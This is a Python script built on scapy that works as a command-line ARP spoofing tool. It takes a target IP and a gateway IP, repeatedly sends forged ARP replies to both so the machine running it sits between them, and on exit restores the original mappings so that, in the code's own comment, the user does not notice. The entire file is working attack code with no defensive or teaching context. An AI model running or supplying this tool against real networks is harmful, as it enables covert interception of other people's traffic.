import scapy.all as scapy
import time
import optparse

def getMacAdress(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    combined_packet = broadcast_packet / arp_request_packet

    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0] #It's returns tuple as answered and unanswered i only need answered so i use [0]

    return answered_list[0][1].hwsrc #[0] first response [0][1] arp object [0][1].hwsrc mac address

def arp_poisoning(target_ip, poisoned_ip):

    target_mac = getMacAdress(target_ip)

    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,  psrc = poisoned_ip )
    scapy.send(arp_response,verbose=False)


def resetOperation(fooled_ip, gateway_ip):
    fooled_mac = getMacAdress(fooled_ip)
    gateway_mac = getMacAdress(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc= gateway_ip, hwsrc = gateway_mac )
    scapy.send(arp_response, verbose=False, count=6) #sending 6 packets to make sure it did reset

    # resetting original state so that user doesnt notice it

def getUserInput():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t","--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")

    options= parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

user_ips = getUserInput()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

number = 0
try:
    while True:

        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        # getting between target and gateway
        number += 2 # each time sending 2 packet

        print("\rSending packets " + str(number),end="") # python3 feature

        time.sleep(3)

except KeyboardInterrupt:
    print("\nQuit & Reset")
    resetOperation(user_target_ip,user_gateway_ip)
    resetOperation(user_gateway_ip,user_target_ip)
